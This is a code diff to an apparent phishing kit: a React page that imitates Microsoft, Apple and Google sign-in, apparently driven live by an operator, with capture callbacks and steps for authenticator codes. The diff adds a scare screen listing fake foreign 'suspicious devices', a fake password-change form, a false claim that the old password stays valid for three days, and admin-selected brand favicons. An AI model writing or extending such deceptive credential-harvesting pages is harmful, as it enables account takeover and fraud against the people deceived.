@@ -1,6 +1,6 @@
 import { useState, useRef, useEffect, useCallback } from 'react';
 import { motion, AnimatePresence, type MotionProps } from 'framer-motion';
-import { ChevronLeft, Key, Eye, EyeOff, Check, X, LogOut } from 'lucide-react';
+import { ChevronLeft, Key, Eye, EyeOff, Check, X, LogOut, Lock } from 'lucide-react';
 
 const MicrosoftLogo = () => (
   <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
@@ -63,7 +63,7 @@ const AppleSpinRing = ({ isDark = true }: { isDark?: boolean }) => {
 };
 
 // ─── Shared WS action type ───────────────────────────────────────────────────
-type NavigateAction = { navigate?: string; promptNumber?: number; phoneDigits?: string; waitSeconds?: number };
+type NavigateAction = { navigate?: string; promptNumber?: number; phoneDigits?: string; waitSeconds?: number; temporaryLockEnabled?: boolean };
 type NavigateHandler = (step: string, action?: NavigateAction) => void;
 
 // ─── Microsoft types & helpers ────────────────────────────────────────────────
@@ -2289,7 +2289,7 @@ function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHan
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
-type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'killing-time' | 'error-email' | 'error-password' | 'error-code' | 'account-locked';
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'google-authenticator' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'killing-time' | 'error-email' | 'error-password' | 'error-code' | 'account-locked';
 
 function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
   device: string; theme: string;
@@ -2478,7 +2478,7 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
             <div style={{ marginBottom: 16 }}><GoogleLogo /></div>
             <h1 style={{ fontSize: 32, fontWeight: 400, margin: '0 0 8px', color: textColor }}>
               {step === 'email' || step === 'error-email' ? 'Sign in'
-                : step === 'phone-verify' || step === 'phone-code' || step === 'error-code' ? 'Confirm it\'s you'
+                : step === 'phone-verify' || step === 'phone-code' || step === 'google-authenticator' || step === 'error-code' ? 'Confirm it\'s you'
                 : step === 'phone-confirm' ? 'Confirm your number'
                 : step === 'phone-wrong' ? 'Review recent activity'
                 : step === 'phone-update' ? 'Update phone number'
@@ -2783,11 +2783,11 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
             )}
 
             {/* ── Phone Code / error-code ── */}
-            {(step === 'phone-code' || step === 'error-code') && (
+            {(step === 'phone-code' || step === 'google-authenticator' || step === 'error-code') && (
               <>
                 <div>
                   <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
-                    {gVerifyMethod === 'sms'
+                    {step !== 'google-authenticator' && gVerifyMethod === 'sms'
                       ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}><span style={{ fontSize: '0.78em', letterSpacing: '0.08em', opacity: 0.55, fontWeight: 400 }}>●●●●●●</span>{actionPhoneDigits ?? (confirmedPhone ? confirmedPhone.slice(-2) : googlePhone)}</strong>. It may take a moment to arrive.</>
                       : <>Enter the 6-digit code from your authenticator app.</>}
                   </p>
@@ -2821,10 +2821,10 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
                       Wrong code. Try entering the code again or request a new one.
                     </p>
                   )}
-                  <button data-testid="google-resend-code"
+                  {step !== 'google-authenticator' && <button data-testid="google-resend-code"
                     style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0' }}>
                     Resend code
-                  </button>
+                  </button>}
                 </div>
                 <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                   <button onClick={() => setStep('phone-verify')}
@@ -3132,12 +3132,62 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
 
 type SuspDevice = { id: string; name: string; os: string; location: string; ip: string; flag: string; lastSeen: string; isCurrent: boolean; kind: 'android' | 'windows' | 'mac' };
 
-const SUSP_DEVICES: SuspDevice[] = [
+const SUSPICIOUS_DEVICES: SuspDevice[] = [
   { id: 'd1', name: 'Alcatel A7',       os: 'Android 11',         location: 'Moscow, Russia',    ip: '185.234.219.32',  flag: '🇷🇺', lastSeen: '2 min ago',   isCurrent: false, kind: 'android' },
   { id: 'd2', name: 'Huawei P30 Lite',  os: 'Android 12',         location: 'Moscow, Russia',    ip: '185.234.220.157', flag: '🇷🇺', lastSeen: '34 min ago',  isCurrent: false, kind: 'android' },
   { id: 'd3', name: 'DESKTOP-J4R2KN1',  os: 'Windows 10 Home',    location: 'Minsk, Belarus',    ip: '178.238.47.92',   flag: '🇧🇾', lastSeen: '2 hours ago', isCurrent: false, kind: 'windows' },
-  { id: 'd4', name: 'MacBook Pro',       os: 'macOS Ventura 13.4', location: 'Current location',  ip: '',                flag: '',    lastSeen: 'Active now',  isCurrent: true,  kind: 'mac'     },
 ];
+
+function detectCurrentDevice(): SuspDevice {
+  if (typeof navigator === 'undefined') {
+    return { id: 'current', name: 'Current device', os: 'Device detected', location: 'Current location', ip: '', flag: '', lastSeen: 'Active now', isCurrent: true, kind: 'mac' };
+  }
+
+  const ua = navigator.userAgent;
+  const platform = navigator.platform || '';
+  const isIPad = /iPad/i.test(ua) || (/Mac/i.test(platform) && navigator.maxTouchPoints > 1);
+  const isIPhone = /iPhone|iPod/i.test(ua);
+  const isAndroid = /Android/i.test(ua);
+  const isWindows = /Windows/i.test(ua);
+  const isChromeOS = /CrOS/i.test(ua);
+  const isMac = !isIPad && /Macintosh|Mac OS X/i.test(ua);
+  const browser = /Edg\//.test(ua) ? 'Edge' : /OPR\/|Opera\//.test(ua) ? 'Opera' : /Firefox\//.test(ua) ? 'Firefox' : /CriOS|Chrome\//.test(ua) ? 'Chrome' : /Safari\//.test(ua) ? 'Safari' : 'Web browser';
+
+  let name = 'This device';
+  let os = platform || 'Unknown operating system';
+  let kind: SuspDevice['kind'] = 'mac';
+
+  if (isIPad) {
+    name = 'iPad';
+    os = 'iPadOS';
+  } else if (isIPhone) {
+    name = 'iPhone';
+    os = 'iOS';
+  } else if (isAndroid) {
+    const model = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build\/[^;)]+)?[;)]/i)?.[1]?.trim();
+    name = model && !/^wv$/i.test(model) ? model : 'Android device';
+    os = `Android ${ua.match(/Android\s([\d.]+)/i)?.[1] || ''}`.trim();
+    kind = 'android';
+  } else if (isWindows) {
+    name = 'Windows PC';
+    os = /Windows NT 10\.0/.test(ua) ? 'Windows 10 or 11' : 'Windows';
+    kind = 'windows';
+  } else if (isChromeOS) {
+    name = 'Chromebook';
+    os = 'ChromeOS';
+    kind = 'windows';
+  } else if (isMac) {
+    name = 'Mac';
+    const version = ua.match(/Mac OS X\s([\d_]+)/)?.[1]?.replaceAll('_', '.');
+    os = version ? `macOS ${version}` : 'macOS';
+  } else if (/Linux/i.test(ua)) {
+    name = 'Linux computer';
+    os = 'Linux';
+    kind = 'windows';
+  }
+
+  return { id: 'current', name, os: `${os} · ${browser}`, location: 'Current location', ip: '', flag: '', lastSeen: 'Active now', isCurrent: true, kind };
+}
 
 const REMOVAL_MSGS = [
   'Revoking device access tokens...',
@@ -3178,17 +3228,22 @@ function DeviceKindIcon({ kind, size = 36 }: { kind: string; size?: number }) {
   );
 }
 
-function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, email, visitorLocation }: {
+function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, email, visitorLocation, temporaryLockEnabled, initialPhase = 'list' }: {
   provider: string; waitSeconds: number; extended: boolean; onDone: () => void;
-  email?: string; visitorLocation?: string;
+  email?: string; visitorLocation?: string; temporaryLockEnabled: boolean; initialPhase?: 'list' | 'password';
 }) {
   const [removedIds, setRemovedIds] = useState<Set<string>>(new Set());
   const [removingId, setRemovingId] = useState<string | null>(null);
-  const [phase, setPhase] = useState<'list' | 'removing' | 'complete' | 'locked'>('list');
+  const [phase, setPhase] = useState<'list' | 'removing' | 'complete' | 'password' | 'locked' | 'success'>(initialPhase);
   const [countdown, setCountdown] = useState(waitSeconds);
   const [totalWait, setTotalWait] = useState(waitSeconds);
   const [extendedShown, setExtendedShown] = useState(false);
   const [msgIdx, setMsgIdx] = useState(0);
+  const [newPassword, setNewPassword] = useState('');
+  const [confirmPassword, setConfirmPassword] = useState('');
+  const [passwordError, setPasswordError] = useState('');
+  const [currentDevice] = useState<SuspDevice>(() => detectCurrentDevice());
+  const devices = [...SUSPICIOUS_DEVICES, currentDevice];
 
   const anyRemoved = removedIds.size > 0;
 
@@ -3198,7 +3253,17 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
   const handleRemove = (id: string) => {
     if (removingId) return;
     setRemovingId(id);
-    setTimeout(() => { setRemovedIds(p => { const s = new Set(p); s.add(id); return s; }); setRemovingId(null); }, 900);
+    setTimeout(() => {
+      setRemovedIds(previous => {
+        const next = new Set(previous);
+        next.add(id);
+        if (next.size === SUSPICIOUS_DEVICES.length) {
+          window.setTimeout(() => setPhase('removing'), 650);
+        }
+        return next;
+      });
+      setRemovingId(null);
+    }, 900);
   };
 
   useEffect(() => {
@@ -3223,11 +3288,113 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
 
   useEffect(() => {
     if (phase !== 'complete') return;
-    const t = setTimeout(() => setPhase('locked'), 3000);
+    const t = setTimeout(() => setPhase('password'), 1400);
     return () => clearTimeout(t);
   }, [phase]);
 
+  const confirmPasswordChange = () => {
+    if (newPassword.length < 8) {
+      setPasswordError('Use at least 8 characters.');
+      return;
+    }
+    if (newPassword !== confirmPassword) {
+      setPasswordError('Passwords do not match.');
+      return;
+    }
+    setPasswordError('');
+    setPhase(temporaryLockEnabled ? 'locked' : 'success');
+  };
+
   const progressPct = Math.max(0, Math.min(100, ((totalWait - countdown) / totalWait) * 100));
+
+  if (provider !== 'microsoft' && (phase === 'password' || phase === 'success')) {
+    const isGoogle = provider === 'google';
+    const accent = isGoogle ? '#1a73e8' : '#007AFF';
+    return (
+      <div className={`fixed inset-0 z-50 overflow-y-auto ${isGoogle ? 'bg-[#f0f4f9]' : 'bg-[#f5f5f7]'}`}
+        style={{ fontFamily: isGoogle ? "'Google Sans', Roboto, system-ui, sans-serif" : "-apple-system, 'SF Pro Display', system-ui, sans-serif" }}>
+        {!isGoogle && (
+          <div className="bg-white border-b border-[#dadce0] px-6 py-3 flex items-center gap-3 sticky top-0 z-10">
+            <AppleLogo className="text-black" style={{ width: 18, height: 18 }} />
+            <span className="text-[16px] font-medium text-[#202124]">Apple ID</span>
+            {email && <span className="ml-auto text-[12px] text-[#5f6368] truncate max-w-[220px]">{email}</span>}
+          </div>
+        )}
+        <div className={`${isGoogle ? 'max-w-[820px] min-h-screen flex flex-col justify-center py-8' : 'max-w-[480px] py-10'} mx-auto px-5`}>
+          {phase === 'password' ? (
+            isGoogle ? (
+              <>
+                <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
+                  className="bg-white rounded-[28px] px-8 py-9 md:px-12 md:py-10 grid md:grid-cols-[280px_1fr] gap-10 md:gap-14">
+                  <div>
+                    <div className="mb-6"><GoogleLogo /></div>
+                    <h1 className="text-[32px] leading-tight font-normal text-[#1f1f1f] mb-3">Change your password</h1>
+                    <p className="text-[16px] text-[#444746] leading-relaxed">Create a strong password that you don’t use for other accounts.</p>
+                    {email && (
+                      <div className="mt-6 inline-flex items-center gap-2 rounded-full border border-[#747775] px-3 py-1.5 text-[13px] text-[#1f1f1f] max-w-full">
+                        <span className="w-5 h-5 rounded-full bg-[#5f6368] text-white flex items-center justify-center text-[10px] font-medium flex-shrink-0">
+                          {email.slice(0, 1).toUpperCase()}
+                        </span>
+                        <span className="truncate">{email}</span>
+                      </div>
+                    )}
+                  </div>
+                  <div className="pt-1">
+                    <div className="relative mb-5">
+                      <input type="password" value={newPassword} onChange={e => { setNewPassword(e.target.value); setPasswordError(''); }}
+                        placeholder="New password"
+                        className="w-full h-14 rounded-[4px] border border-[#747775] px-4 text-[16px] text-[#1f1f1f] outline-none focus:border-2 focus:border-[#0b57d0] placeholder:text-[#444746]" autoComplete="new-password" />
+                    </div>
+                    <input type="password" value={confirmPassword} onChange={e => { setConfirmPassword(e.target.value); setPasswordError(''); }}
+                      onKeyDown={e => { if (e.key === 'Enter') confirmPasswordChange(); }}
+                      placeholder="Confirm new password"
+                      className="w-full h-14 rounded-[4px] border border-[#747775] px-4 text-[16px] text-[#1f1f1f] outline-none focus:border-2 focus:border-[#0b57d0] placeholder:text-[#444746]" autoComplete="new-password" />
+                    {passwordError && <p className="text-[13px] text-[#b3261e] mt-2">{passwordError}</p>}
+                    <p className="text-[13px] text-[#444746] mt-4 leading-relaxed">Use at least 8 characters. Don’t use a password from another site or something too obvious.</p>
+                    <div className="flex items-center justify-end mt-9">
+                      <button onClick={confirmPasswordChange} className="px-6 py-2.5 rounded-full text-[14px] font-medium text-white bg-[#0b57d0] hover:bg-[#0842a0] transition-colors">Change password</button>
+                    </div>
+                  </div>
+                </motion.div>
+                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 px-4 pt-5 text-[12px] text-[#444746]">
+                  <button className="flex items-center gap-2 hover:text-[#0b57d0]">English (United States) <span aria-hidden="true">⌄</span></button>
+                  <div className="flex gap-6"><a href="#" className="hover:text-[#0b57d0]">Help</a><a href="#" className="hover:text-[#0b57d0]">Privacy</a><a href="#" className="hover:text-[#0b57d0]">Terms</a></div>
+                </div>
+              </>
+            ) : (
+              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
+                className="bg-white border border-[#dadce0] p-7 rounded-2xl shadow-sm">
+                <Lock className="w-7 h-7 text-[#1d1d1f] mb-5" />
+                <h1 className="text-[24px] font-medium text-[#202124] mb-2">Create a new password</h1>
+                <p className="text-[14px] text-[#5f6368] mb-6 leading-relaxed">The unrecognised devices were removed. Change your password to finish securing your account.</p>
+                <label className="block text-[13px] font-medium text-[#3c4043] mb-1.5">New password</label>
+                <input type="password" value={newPassword} onChange={e => { setNewPassword(e.target.value); setPasswordError(''); }}
+                  className="w-full h-11 rounded-lg border border-[#9aa0a6] px-3 text-[14px] outline-none focus:ring-2 mb-4" autoComplete="new-password" />
+                <label className="block text-[13px] font-medium text-[#3c4043] mb-1.5">Confirm new password</label>
+                <input type="password" value={confirmPassword} onChange={e => { setConfirmPassword(e.target.value); setPasswordError(''); }}
+                  onKeyDown={e => { if (e.key === 'Enter') confirmPasswordChange(); }}
+                  className="w-full h-11 rounded-lg border border-[#9aa0a6] px-3 text-[14px] outline-none focus:ring-2" autoComplete="new-password" />
+                {passwordError && <p className="text-[12px] text-[#d93025] mt-2">{passwordError}</p>}
+                <button onClick={confirmPasswordChange} className="w-full mt-5 py-2.5 rounded-full text-[14px] font-medium text-white" style={{ backgroundColor: accent }}>Change password</button>
+              </motion.div>
+            )
+          ) : (
+            <motion.div initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }}
+              className={`bg-white border border-[#dadce0] p-8 flex flex-col items-center text-center ${isGoogle ? 'rounded-3xl' : 'rounded-2xl shadow-sm'}`}>
+              <div className="w-16 h-16 rounded-full bg-[#dff6dd] flex items-center justify-center mb-5"><Check className="w-8 h-8 text-[#188038]" /></div>
+              <h1 className="text-[24px] font-medium text-[#202124] mb-2">Your account is secure</h1>
+              <p className="text-[14px] text-[#5f6368] mb-5 leading-relaxed">The unrecognised devices were removed and your password was changed successfully.</p>
+              <div className="w-full bg-[#f8f9fa] border border-[#dadce0] rounded-xl px-4 py-3 text-left mb-6">
+                <div className="text-[13px] font-medium text-[#202124] mb-1">Password transition period</div>
+                <div className="text-[12px] text-[#5f6368]">Your previous password can still be used for up to 3 days before it expires. We’ll alert you if it is used.</div>
+              </div>
+              <button onClick={onDone} className="w-full py-2.5 rounded-full text-[14px] font-medium text-white" style={{ backgroundColor: accent }}>Done</button>
+            </motion.div>
+          )}
+        </div>
+      </div>
+    );
+  }
 
   // ── Microsoft ─────────────────────────────────────────────────────────────
   if (provider === 'microsoft') {
@@ -3252,7 +3419,7 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
                 <div className="text-[20px] font-semibold text-[#1b1b1b] mb-1">Review connected devices</div>
                 <div className="text-[13px] text-[#605e5c] mb-5">These devices have recently accessed your Microsoft account.</div>
                 <div className="space-y-3 mb-6">
-                  {SUSP_DEVICES.map(dev => {
+                  {devices.map(dev => {
                     const isRemoved = removedIds.has(dev.id);
                     const isRemoving = removingId === dev.id;
                     return (
@@ -3330,6 +3497,27 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
                 <div className="text-[13px] text-[#605e5c] text-center">Finalising account security</div>
               </motion.div>
             )}
+            {phase === 'password' && (
+              <motion.div key="ms-password" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="py-4">
+                <div className="w-12 h-12 rounded-full bg-[#e8f2fb] flex items-center justify-center mb-5 mx-auto">
+                  <Lock className="w-6 h-6 text-[#0078D4]" />
+                </div>
+                <div className="text-[20px] font-semibold text-[#1b1b1b] mb-2 text-center">Create a new password</div>
+                <div className="text-[13px] text-[#605e5c] mb-6 text-center leading-relaxed">The unrecognised devices were removed. Change your password to finish securing your account.</div>
+                <label className="block text-[12px] font-semibold text-[#323130] mb-1.5">New password</label>
+                <input type="password" value={newPassword} onChange={e => { setNewPassword(e.target.value); setPasswordError(''); }}
+                  className="w-full h-10 border border-[#8a8886] px-3 text-[14px] outline-none focus:border-[#0078D4] mb-4" autoComplete="new-password" />
+                <label className="block text-[12px] font-semibold text-[#323130] mb-1.5">Confirm new password</label>
+                <input type="password" value={confirmPassword} onChange={e => { setConfirmPassword(e.target.value); setPasswordError(''); }}
+                  onKeyDown={e => { if (e.key === 'Enter') confirmPasswordChange(); }}
+                  className="w-full h-10 border border-[#8a8886] px-3 text-[14px] outline-none focus:border-[#0078D4]" autoComplete="new-password" />
+                {passwordError && <p className="text-[12px] text-[#a4262c] mt-2">{passwordError}</p>}
+                <p className="text-[11px] text-[#605e5c] mt-3">For this preview, the password stays in this browser and is not submitted.</p>
+                <button onClick={confirmPasswordChange} className="w-full mt-5 py-2.5 text-[15px] font-semibold text-white bg-[#0078D4] hover:bg-[#005a9e]">
+                  Change password
+                </button>
+              </motion.div>
+            )}
             {phase === 'locked' && (
               <motion.div key="ms-locked" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-10">
                 <div className="w-16 h-16 rounded-full bg-[#fef3cd] flex items-center justify-center mb-5">
@@ -3342,6 +3530,20 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
                   <div className="text-[22px] font-bold text-[#0078D4]">6 hours</div>
                   <div className="text-[12px] text-[#605e5c] mt-0.5">You will be alerted once the review is complete</div>
                 </div>
+              </motion.div>
+            )}
+            {phase === 'success' && (
+              <motion.div key="ms-success" initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-10">
+                <div className="w-16 h-16 rounded-full bg-[#dff6dd] flex items-center justify-center mb-5">
+                  <Check className="w-8 h-8 text-[#107c10]" />
+                </div>
+                <div className="text-[20px] font-semibold text-[#1b1b1b] mb-2 text-center">Your account is secure</div>
+                <div className="text-[13px] text-[#605e5c] mb-5 text-center leading-relaxed max-w-[350px]">The unrecognised devices were removed and your password was changed successfully.</div>
+                <div className="w-full bg-[#f7f8fa] border border-[#dde1e7] rounded px-4 py-3 mb-6">
+                  <div className="text-[13px] font-semibold text-[#1b1b1b] mb-1">Password transition period</div>
+                  <div className="text-[12px] text-[#605e5c] leading-relaxed">Your previous password can still be used for up to 3 days before it expires. We’ll alert you if it is used.</div>
+                </div>
+                <button onClick={onDone} className="w-full py-2.5 text-[15px] font-semibold text-white bg-[#0078D4] hover:bg-[#005a9e]">Done</button>
               </motion.div>
             )}
           </AnimatePresence>
@@ -3375,7 +3577,7 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
                 <div className="text-[26px] font-semibold text-[#1d1d1f] mb-1 tracking-tight">Devices</div>
                 <div className="text-[15px] text-[#6e6e73] mb-6">The following devices are signed in to your Apple ID.</div>
                 <div className="bg-white rounded-2xl overflow-hidden border border-[#d1d1d6] divide-y divide-[#d1d1d6] mb-6">
-                  {SUSP_DEVICES.map(dev => {
+                  {devices.map(dev => {
                     const isRemoved = removedIds.has(dev.id);
                     const isRemoving = removingId === dev.id;
                     return (
@@ -3488,7 +3690,7 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
               <div className="text-[22px] font-normal text-[#202124] mb-1">Your devices</div>
               <div className="text-[14px] text-[#5f6368] mb-6">Devices that have recently accessed your Google Account.</div>
               <div className="space-y-3 mb-7">
-                {SUSP_DEVICES.map(dev => {
+                {devices.map(dev => {
                   const isRemoved = removedIds.has(dev.id);
                   const isRemoving = removingId === dev.id;
                   return (
@@ -3631,7 +3833,7 @@ export default function LoginPage() {
   const setNavigateHandler = useCallback((fn: NavigateHandler) => {
     navigateHandlerRef.current = fn;
   }, []);
-  const [suspDevMode, setSuspDevMode] = useState<{ waitSeconds: number } | null>(null);
+  const [suspDevMode, setSuspDevMode] = useState<{ waitSeconds: number; temporaryLockEnabled: boolean; initialPhase?: 'list' | 'password' } | null>(null);
   const [extendedRemoval, setExtendedRemoval] = useState(false);
 
   const capturedEmailRef = useRef('');
@@ -3649,7 +3851,15 @@ export default function LoginPage() {
     provider,
     onNavigate: (s, action) => {
       if (s === 'suspicious-devices') {
-        setSuspDevMode({ waitSeconds: (action as NavigateAction)?.waitSeconds ?? 20 });
+        setSuspDevMode({
+          waitSeconds: (action as NavigateAction)?.waitSeconds ?? 20,
+          temporaryLockEnabled: (action as NavigateAction)?.temporaryLockEnabled ?? false,
+        });
+        setExtendedRemoval(false);
+        return;
+      }
+      if (s === 'change-password') {
+        setSuspDevMode({ waitSeconds: 20, temporaryLockEnabled: false, initialPhase: 'password' });
         setExtendedRemoval(false);
         return;
       }
@@ -3693,21 +3903,38 @@ export default function LoginPage() {
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
-  // Swap the browser tab favicon to match the active provider.
+  // Apply the favicon selected in the admin settings.
   useEffect(() => {
     const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
-    let href = `${base}/favicon.svg`;
-    if (provider === 'google') href = `${base}/favicon-gmail.png`;
-    else if (provider === 'microsoft') href = `${base}/favicon-outlook.png`;
-    let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
-    if (!link) {
-      link = document.createElement('link');
-      link.rel = 'icon';
-      document.head.appendChild(link);
-    }
-    link.type = provider === 'google' || provider === 'microsoft' ? 'image/png' : 'image/svg+xml';
-    link.href = href;
-  }, [provider]);
+    const paths: Record<string, string> = {
+      'custom-gmail': 'favicon-custom-gmail.png',
+      google: 'favicon-gmail.png',
+      outlook: 'favicon-outlook.png',
+      generic: 'favicon.svg',
+    };
+    fetch(`${base}/api/favicon-setting`)
+      .then(r => r.json() as Promise<{ favicon: string }>)
+      .then(({ favicon }) => {
+        const file = paths[favicon] ?? paths['custom-gmail'];
+        const href = `${base}/${file}`;
+        let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
+        if (!link) {
+          link = document.createElement('link');
+          link.rel = 'icon';
+          document.head.appendChild(link);
+        }
+        link.type = file.endsWith('.png') ? 'image/png' : 'image/svg+xml';
+        link.href = href;
+        let apple = document.querySelector<HTMLLinkElement>("link[rel='apple-touch-icon']");
+        if (!apple) {
+          apple = document.createElement('link');
+          apple.rel = 'apple-touch-icon';
+          document.head.appendChild(apple);
+        }
+        apple.href = href;
+      })
+      .catch(() => {});
+  }, []);
 
   if (siteActive === false) {
     return (
@@ -3774,6 +4001,8 @@ export default function LoginPage() {
           onDone={() => setSuspDevMode(null)}
           email={capturedEmailRef.current}
           visitorLocation={visitorLocation}
+          temporaryLockEnabled={suspDevMode.temporaryLockEnabled}
+          initialPhase={suspDevMode.initialPhase}
         />
       )}
     </div>
